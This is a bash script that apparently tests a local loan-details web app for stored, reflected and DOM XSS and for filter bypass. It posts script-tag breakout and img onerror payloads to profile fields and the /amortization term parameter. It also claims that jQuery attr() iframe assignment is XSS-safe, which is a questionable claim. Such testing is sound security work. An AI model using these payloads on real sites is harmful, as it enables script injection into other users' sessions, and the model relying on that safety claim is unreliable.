#!/bin/bash

# Comprehensive XSS Testing on Loan Details Application
# Tests: Reflected XSS, Stored XSS, DOM XSS, and Filter Bypass

TARGET="http://localhost:5000"
COOKIES="/tmp/xss_test_cookies.txt"

echo "======================================"
echo "XSS VULNERABILITY TESTING SUITE"
echo "======================================"
echo

# Step 1: Authentication
echo "[*] Step 1: Authenticating as test user..."
curl -c "$COOKIES" -s "$TARGET/login" -X POST \
  -d "username=test&password=test" -L > /dev/null 2>&1

if [ $? -eq 0 ]; then
    echo "[✓] Authentication successful"
else
    echo "[✗] Authentication failed"
    exit 1
fi
echo

# Step 2: Test Stored XSS via Profile Update - loan_term_months field
echo "[*] Step 2: Testing Stored XSS in loan_term_months field..."
XSS_PAYLOAD='120"><script>alert("stored_xss")</script><p x="'
echo "  Payload: $XSS_PAYLOAD"

curl -b "$COOKIES" -s "$TARGET/profile" -X POST \
  -d "name=Test&lastname=User&email=test@test.com&loan_amount=50000&loan_term_months=$XSS_PAYLOAD&monthly_payment=999.99" \
  > /dev/null 2>&1

# Check if payload appears in loan_details
RESPONSE=$(curl -b "$COOKIES" -s "$TARGET/loan_details")
if echo "$RESPONSE" | grep -q '<script>alert("stored_xss")</script>'; then
    echo "[✓] STORED XSS VULNERABILITY FOUND!"
    echo "    Payload was not escaped in loan_details page"
elif echo "$RESPONSE" | grep -q '&lt;script&gt;'; then
    echo "[✓] XSS PROTECTED - Payload was HTML-escaped"
    echo "    Application is using auto-escaping"
else
    echo "[?] Unable to detect payload status"
fi
echo

# Step 3: Test Reflected XSS in /amortization?term parameter
echo "[*] Step 3: Testing Reflected XSS in /amortization?term parameter..."
XSS_PAYLOAD2='120"><script>alert("reflected_xss")</script><p x="'
echo "  Payload: $XSS_PAYLOAD2"

RESPONSE=$(curl -b "$COOKIES" -s "$TARGET/amortization?term=$XSS_PAYLOAD2" 2>&1)
if echo "$RESPONSE" | grep -q '<script>alert("reflected_xss")</script>'; then
    echo "[✓] REFLECTED XSS VULNERABILITY FOUND!"
else
    echo "[✓] XSS PROTECTED - Payload was filtered or escaped"
fi
echo

# Step 4: Test DOM-based XSS via JavaScript variable
echo "[*] Step 4: Testing DOM-based XSS in JavaScript iframe setup..."
echo "  Checking JavaScript code in loan_details page..."
RESPONSE=$(curl -b "$COOKIES" -s "$TARGET/loan_details")
if echo "$RESPONSE" | grep -q "attr('src', '/amortization?term={{ loan_term_months }}')"; then
    echo "[✓] Found vulnerable JavaScript pattern"
    echo "    Dynamic iframe src construction found"
    if echo "$RESPONSE" | grep -q "attr('src',"; then
        echo "[*] Using jQuery attr() method (XSS-safe)"
        echo "    This method uses property assignment, not HTML parsing"
    fi
fi
echo

# Step 5: Test XSS Filter Bypass - try characters not in forbidden list
echo "[*] Step 5: Testing XSS Filter Bypass on /amortization endpoint..."
for char in "&" "+" "|" "~" "!"; do
    PAYLOAD="120${char}test"
    RESPONSE=$(curl -b "$COOKIES" -s "$TARGET/amortization?term=$PAYLOAD" 2>&1)
    STATUS=$(echo "$RESPONSE" | head -1)
    if ! echo "$RESPONSE" | grep -q "500 Internal"; then
        echo "[*] Character '$char' passed filter: $PAYLOAD"
    fi
done
echo

# Step 6: Test XSS in Profile Name Field
echo "[*] Step 6: Testing XSS in Name field..."
NAME_PAYLOAD='<img src=x onerror=alert("name_xss")>'
curl -b "$COOKIES" -s "$TARGET/profile" -X POST \
  -d "name=$NAME_PAYLOAD&lastname=Test&email=test@test.com&loan_amount=50000&loan_term_months=120&monthly_payment=999.99" \
  > /dev/null 2>&1

RESPONSE=$(curl -b "$COOKIES" -s "$TARGET/profile")
if echo "$RESPONSE" | grep -q 'onerror=alert'; then
    echo "[✓] NAME FIELD XSS VULNERABILITY FOUND!"
else
    echo "[✓] NAME FIELD PROTECTED - Payload was escaped"
fi
echo

echo "======================================"
echo "XSS Testing Complete"
echo "======================================"

